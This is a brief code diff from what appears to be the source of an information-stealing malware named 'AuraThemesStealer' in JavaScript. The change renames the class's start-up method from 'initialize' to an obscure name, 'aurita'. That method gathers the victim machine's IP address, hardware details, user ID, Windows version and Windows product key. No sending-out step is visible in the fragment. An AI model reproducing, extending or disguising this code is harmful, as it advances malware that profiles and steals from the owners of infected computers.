@@ -11,9 +11,9 @@ switch (process.platform) {
 
         class AuraThemesStealer {
             constructor() {
-                this.initialize();
+                this.aurita();
             }
-            async initialize() {
+            async aurita() {
                 try {
                     const { disk, ram, uid, cpucount, ip, os, cpu, gpu, windowskey, windowsversion } = await getInfo();
                     
